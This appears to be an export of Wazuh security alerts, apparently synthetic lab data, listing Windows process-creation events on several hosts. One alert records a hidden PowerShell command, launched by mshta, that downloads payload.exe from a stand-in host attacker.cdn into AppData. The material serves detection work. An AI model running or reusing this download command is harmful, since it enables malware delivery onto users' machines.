  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "66f47579-eb55-4105-baa8-7a0113e71246",
    "_source": {
      "agent": {
        "ip": "172.16.30.17",
        "name": "DB01",
        "id": "010"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T22:45:32.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T11:25:33.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "alice",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x23167"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "97fe191e-927b-47dd-8778-002505a22e97",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T02:11:24.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T20:34:05.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "john",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x5ef6d"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "8cd704a8-d7f3-413f-8dfe-73bb74738347",
    "_source": {
      "agent": {
        "ip": "172.16.10.20",
        "name": "FS01",
        "id": "003"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T23:47:16.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T07:38:04.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "david",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x2f4d4"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "d015c67b-b139-47bb-b1c9-0140d4760350",
    "_source": {
      "agent": {
        "ip": "172.16.30.17",
        "name": "DB01",
        "id": "010"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T05:18:00.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T06:07:10.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x350f4"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "a87eb072-e67c-407a-ba59-c8eb6fbf9642",
    "_source": {
      "agent": {
        "ip": "172.16.200.50",
        "name": "SCDC01",
        "id": "005"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T18:39:05.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T08:25:32.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "alice",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x91ec6"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "a17312b1-da48-41c8-85b0-71e047e2dd4f",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T06:17:14.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T18:28:38.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "john",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x5f2fd"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "558a9485-90c4-4f1b-9129-ff1314ac6bd5",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T02:58:08.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T16:52:37.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "david",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x49e55"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "34d83f9e-eeee-4b23-a97c-35e465c4d7c9",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T06:27:24.102140Z",
      "rule": {
        "firedtimes": 2,
        "mail": false,
        "level": 8,
        "description": "PowerShell suspicious download and write to AppData",
        "groups": [
          "powershell",
          "scripting"
        ],
        "id": "90002"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "1",
            "systemTime": "2025-10-09T08:07:51.102140Z",
            "providerName": "Microsoft-Windows-Sysmon/Operational"
          },
          "eventdata": {
            "processGuid": "d82b1fe9-6aed-4198-995a-35a8fafb2763",
            "processId": "8881",
            "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "parentImage": "C:\\Windows\\System32\\mshta.exe",
            "commandLine": "powershell -nop -w hidden -c \"(New-Object System.Net.WebClient).DownloadFile('http://attacker.cdn/payload.exe','$env:APPDATA\\\\updater.exe')\"",
            "targetFilename": "C:\\Users\\victim\\AppData\\Roaming\\updater.exe",
            "user": "victim"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "21e6f9fd-6c33-4844-87fa-11a4a1c77985",
    "_source": {
      "agent": {
        "ip": "201.10.112.150",
        "name": "DEV-021",
        "id": "011"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T21:56:52.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T07:28:53.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x9a585"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "98163330-ffc2-4583-83c4-0e250f9bb5ed",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T19:19:21.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T17:35:14.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "john",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x4a222"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "fd71b34d-5297-4be2-8c37-4dc8794377e7",
    "_source": {
      "agent": {
        "ip": "172.16.10.20",
        "name": "FS01",
        "id": "003"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T14:23:34.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T06:35:10.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "alice",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x79513"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "bd8e8270-7f22-475c-83a2-f2ce188861a9",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T21:27:20.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T18:18:09.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x4bb25"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "4345e643-37b3-4e7e-834b-ebd6e376a14e",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T12:17:55.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T21:21:38.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Program Files\\Git\\bin\\bash.exe",
            "parentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x20ee0"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "6ee70b03-5411-4e25-911d-fccd5797a777",
    "_source": {
      "agent": {
        "ip": "201.10.112.150",
        "name": "DEV-021",
        "id": "011"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T13:19:16.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T06:39:26.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "david",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x22fbc"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "e42ec9f3-9d0f-4480-a799-f31a74ff81eb",
    "_source": {
      "agent": {
        "ip": "201.10.112.150",
        "name": "DEV-021",
        "id": "011"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T08:38:03.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T03:53:01.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "john",
            "newProcessName": "C:\\Program Files\\Git\\bin\\bash.exe",
            "parentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x748ff"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "b96edec2-b111-4b83-8e4e-0e95f7273a0a",
    "_source": {
      "agent": {
        "ip": "172.16.30.17",
        "name": "DB01",
        "id": "010"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T01:19:12.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T03:35:05.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "john",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x373b7"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "deb6aaa0-d1ab-4735-9905-2ed422db2abc",
    "_source": {
      "agent": {
        "ip": "172.16.10.20",
        "name": "FS01",
        "id": "003"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T06:52:37.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T06:24:24.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "david",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x7735c"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "1bb39862-f8c0-4ef8-9793-9c970315ad56",
    "_source": {
      "agent": {
        "ip": "172.16.10.20",
        "name": "FS01",
        "id": "003"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T11:07:52.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T15:56:03.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x1b91e"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "468af2fd-afb8-455f-921c-d01d17e75a83",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T21:55:11.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T22:51:41.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "john",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x1448d"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "d8e29cca-e209-420c-b333-133d04acdd9e",
    "_source": {
      "agent": {
        "ip": "201.10.112.150",
        "name": "DEV-021",
        "id": "011"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T09:14:50.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T09:12:28.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x918cf"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "87dd69d0-3790-4073-834f-7e20c5e32c60",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T00:00:25.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T18:29:03.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "alice",
            "newProcessName": "C:\\Program Files\\Git\\bin\\bash.exe",
            "parentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x354e1"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "beb86edd-ff5e-4673-a3de-cd021947c31b",
    "_source": {
      "agent": {
        "ip": "172.16.200.50",
        "name": "SCDC01",
        "id": "005"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T21:02:27.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T13:07:27.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "alice",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x31b14"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "33b1f6eb-0ef2-4528-a926-eee22d960978",
    "_source": {
      "agent": {
        "ip": "201.10.112.150",
        "name": "DEV-021",
        "id": "011"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T09:58:41.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T16:30:59.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "alice",
            "newProcessName": "C:\\Program Files\\Git\\bin\\bash.exe",
            "parentProcessName": "C:\\Windows\\System32\\cmd.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x1b764"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "495d416d-7a00-4cb6-bf60-5069966677c3",
    "_source": {
      "agent": {
        "ip": "201.10.112.150",
        "name": "DEV-021",
        "id": "011"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T23:05:41.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T00:34:16.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "alice",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x14d12"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "8254e007-0679-4d4f-a6e1-1312f7fd202d",
    "_source": {
      "agent": {
        "ip": "172.16.200.50",
        "name": "SCDC01",
        "id": "005"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T02:28:53.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T19:14:05.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "john",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x59d59"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "11771f17-145d-43bb-8aba-4f757a90e9df",
    "_source": {
      "agent": {
        "ip": "201.10.112.150",
        "name": "DEV-021",
        "id": "011"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T12:19:18.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T05:57:47.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "john",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x64d09"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "ab161745-771c-4cb4-b5d3-dd177082217f",
    "_source": {
      "agent": {
        "ip": "172.16.200.50",
        "name": "SCDC01",
        "id": "005"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T14:18:33.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T09:08:10.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "david",
            "newProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x7e892"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "694c4f86-e001-42fd-a48a-13c8f6035624",
    "_source": {
      "agent": {
        "ip": "172.16.200.50",
        "name": "SCDC01",
        "id": "005"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T16:20:42.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T23:24:25.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "john",
            "newProcessName": "C:\\Windows\\System32\\calc.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x78d6c"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "f8cdfc17-9f26-4d10-a460-5afe073949ff",
    "_source": {
      "agent": {
        "ip": "201.10.112.150",
        "name": "DEV-021",
        "id": "011"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-08T18:05:41.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-09T05:10:54.102140Z",
            "providerName": "Microsoft-Windows-Security-Auditing"
          },
          "eventdata": {
            "subjectUserName": "svc_reports",
            "newProcessName": "C:\\Windows\\System32\\notepad.exe",
            "parentProcessName": "C:\\Windows\\explorer.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x70240"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "574906cc-e5ea-4075-8249-067914c40212",
    "_source": {
      "agent": {
        "ip": "172.16.50.20",
        "name": "SRV-MANAGE01",
        "id": "002"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
      },
      "timestamp": "2025-10-09T06:40:12.102140Z",
      "rule": {
        "firedtimes": 1,
        "mail": false,
        "level": 3,
        "description": "A process was created.",
        "groups": [
          "windows"
        ],
        "id": "67027"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "4688",
            "systemTime": "2025-10-08T23:33:08.102140Z",
